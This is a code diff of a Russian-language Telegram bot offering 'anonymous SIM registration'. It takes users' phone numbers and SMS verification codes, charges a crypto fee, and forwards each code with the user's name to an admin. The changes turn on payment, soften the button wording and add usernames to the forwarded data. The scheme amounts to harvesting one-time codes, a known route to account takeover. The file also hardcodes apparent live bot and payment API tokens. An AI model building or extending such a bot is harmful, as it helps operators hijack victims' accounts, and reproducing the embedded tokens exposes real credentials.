@@ -12,6 +12,8 @@ from aiogram.types import (
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
+
+# ИСПРАВЛЕННЫЙ ИМПОРТ
 from aiocryptopay import AioCryptoPay
 
 # ================= НАСТРОЙКИ =================
@@ -19,16 +21,18 @@ TOKEN = "8623489996:AAE5rfYaS4JbAGrso_veeFALIsLagXx74s8"
 ADMIN_ID = 8209617821
 CRYPTO_TOKEN = "553031:AAYPKOXkV5DTYcbIKdQYUlhLFwrI9Ah0YYG"
 
-# --- РЕЖИМ ТЕСТИРОВАНИЯ ---
-FREE_MODE = True  # Поставь False, чтобы включить оплату
-# --------------------------
+# ПЕРЕКЛЮЧАТЕЛЬ: True - бесплатно, False - через оплату
+FREE_MODE = False
 
 PRICE_USD = 2.58 
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
+
+# Инициализация без Const
 crypto = AioCryptoPay(token=CRYPTO_TOKEN)
+
 router = Router()
 dp.include_router(router)
 
@@ -40,7 +44,9 @@ pending_requests: List[Dict[str, Any]] = []
 
 # ================= КЛАВИАТУРЫ =================
 def get_main_kb():
-    return ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="📞 Сдать номер на вериф")]], resize_keyboard=True)
+    return ReplyKeyboardMarkup(keyboard=[
+        [KeyboardButton(text="📞 Зарегистрировать номер")]
+    ], resize_keyboard=True)
 
 def get_operators_kb():
     return ReplyKeyboardMarkup(keyboard=[
@@ -51,10 +57,13 @@ def get_operators_kb():
 # ================= ХЕНДЛЕРЫ =================
 @router.message(CommandStart())
 async def cmd_start(message: Message):
-    status_text = "🆓 СЕЙЧАС БЕСПЛАТНО (ТЕСТ)" if FREE_MODE else f"💰 ЦЕНА: ${PRICE_USD}"
-    await message.answer(f"👋 Привет! Анонимная регистрация SIM.\n{status_text}", reply_markup=get_main_kb())
+    status = "🆓 ТЕСТОВЫЙ РЕЖИМ (БЕСПЛАТНО)" if FREE_MODE else f"💰 ЦЕНА: ${PRICE_USD}"
+    await message.answer(
+        f"👋 Привет! Анонимная регистрация SIM.\n{status}", 
+        reply_markup=get_main_kb()
+    )
 
-@router.message(F.text == "📞 Сдать номер на вериф")
+@router.message(F.text == "📞 Зарегистрировать номер")
 async def start_reg(message: Message, state: FSMContext):
     await state.clear()
     await message.answer("📊 Выбери оператора:", reply_markup=get_operators_kb())
@@ -74,50 +83,59 @@ async def process_phone(message: Message, state: FSMContext):
     
     data = await state.get_data()
     rid = len(pending_requests) + 1
+    
+    # Получаем юзернейм или имя пользователя
+    user_info = f"@{message.from_user.username}" if message.from_user.username else f"ID: {message.from_user.id} ({message.from_user.first_name})"
 
-    # --- ЛОГИКА БЕСПЛАТНОГО РЕЖИМА ---
     if FREE_MODE:
         pending_requests.append({
-            "id": rid, "user_id": message.chat.id, "phone": phone, 
-            "operator": data['operator'], "status": "waiting_sms"
+            "id": rid, 
+            "user_id": message.chat.id, 
+            "username": user_info,
+            "phone": phone, 
+            "operator": data['operator'], 
+            "status": "waiting_sms"
         })
-        await message.answer("✅ **Заявка принята (БЕСПЛАТНО)**\n\nТеперь введите код из СМС:", parse_mode="Markdown")
-        await bot.send_message(ADMIN_ID, f"🆓 ТЕСТОВАЯ ЗАЯВКА #{rid}\nНомер: {phone}")
+        await message.answer("✅ Заявка принята! Теперь введите код из СМС:", parse_mode="Markdown")
+        await bot.send_message(ADMIN_ID, f"🆓 ТЕСТ: #{rid}\n👤 Пользователь: {user_info}\n📱 Номер: {phone}")
         await state.clear()
         return
 
-    # --- ЛОГИКА ПЛАТНОГО РЕЖИМА ---
     try:
         invoice = await crypto.create_invoice(asset='USDT', amount=PRICE_USD)
-        rid = invoice.invoice_id
         pending_requests.append({
-            "id": rid, "user_id": message.chat.id, "phone": phone, 
-            "operator": data['operator'], "status": "waiting_pay"
+            "id": invoice.invoice_id, 
+            "user_id": message.chat.id, 
+            "username": user_info,
+            "phone": phone, 
+            "operator": data['operator'], 
+            "status": "waiting_pay"
         })
         kb = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="💳 Оплатить", url=invoice.pay_url)],
-            [InlineKeyboardButton(text="✅ Проверить оплату", callback_data=f"check_{rid}")]
+            [InlineKeyboardButton(text="✅ Проверить оплату", callback_data=f"check_{invoice.invoice_id}")]
         ])
-        await message.answer(f"🧾 Заявка #{rid}\n💰 К оплате: {PRICE_USD} USDT", reply_markup=kb)
+        await message.answer(f"🧾 Заявка #{invoice.invoice_id}\n💰 Сумма: {PRICE_USD} USDT", reply_markup=kb)
+        await bot.send_message(ADMIN_ID, f"🆕 НОВАЯ ЗАЯВКА #{invoice.invoice_id}\n👤 Пользователь: {user_info}\n📱 Номер: {phone}")
         await state.clear()
     except Exception as e:
-        logging.error(f"Ошибка: {e}")
+        logging.error(f"Error: {e}")
         await message.answer("⚠️ Ошибка системы платежей.")
 
 # ================= ПРОВЕРКА ОПЛАТЫ =================
 @router.callback_query(F.data.startswith("check_"))
 async def check_payment(callback: CallbackQuery):
     rid = int(callback.data.split("_")[1])
-    invoices = await crypto.get_invoices(status='paid')
     
+    invoices = await crypto.get_invoices(status='paid')
     is_paid = any(inv.invoice_id == rid for inv in (invoices or []))
 
     if is_paid:
         for req in pending_requests:
             if req["id"] == rid:
                 req["status"] = "waiting_sms"
-                await callback.message.edit_text("💰 Оплата подтверждена!\n\nВведите код из СМС:")
-                await bot.send_message(ADMIN_ID, f"✅ ОПЛАЧЕНО: #{rid}\nНомер: {req['phone']}")
+                await callback.message.edit_text("💰 Оплачено! Введите код из СМС:")
+                await bot.send_message(ADMIN_ID, f"✅ ОПЛАЧЕНО: #{rid}\n👤 От: {req['username']}\n📱 Номер: {req['phone']}")
                 break
     else:
         await callback.answer("❌ Оплата не найдена.", show_alert=True)
@@ -126,6 +144,7 @@ async def check_payment(callback: CallbackQuery):
 @router.message()
 async def catch_sms(message: Message):
     if message.chat.id == ADMIN_ID: return
+    
     req = next((r for r in pending_requests if r["user_id"] == message.chat.id and r["status"] == "waiting_sms"), None)
     
     if req and message.text.isdigit():
@@ -133,9 +152,14 @@ async def catch_sms(message: Message):
         kb = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="🏁 Завершить", callback_data=f"done_{req['id']}")]
         ])
-        await bot.send_message(ADMIN_ID, f"🔑 КОД СМС: `{message.text}`\nНомер: {req['phone']}", reply_markup=kb)
+        await bot.send_message(
+            ADMIN_ID, 
+            f"🔑 **ПОЛУЧЕН КОД СМС:** `{message.text}`\n👤 От: {req['username']}\n📱 Номер: {req['phone']}", 
+            reply_markup=kb, 
+            parse_mode="Markdown"
+        )
     elif req:
-        await message.answer("Введи только цифры!")
+        await message.answer("Введите цифры!")
 
 @router.callback_query(F.data.startswith("done_"))
 async def finish_job(callback: CallbackQuery):
@@ -143,7 +167,7 @@ async def finish_job(callback: CallbackQuery):
     for req in pending_requests:
         if req["id"] == rid:
             req["status"] = "completed"
-            await bot.send_message(req["user_id"], "🎉 Регистрация завершена!")
+            await bot.send_message(req["user_id"], "🎉 Регистрация успешно завершена!")
             await callback.message.edit_text(f"🏁 Заявка #{rid} закрыта.")
             break
     await callback.answer()
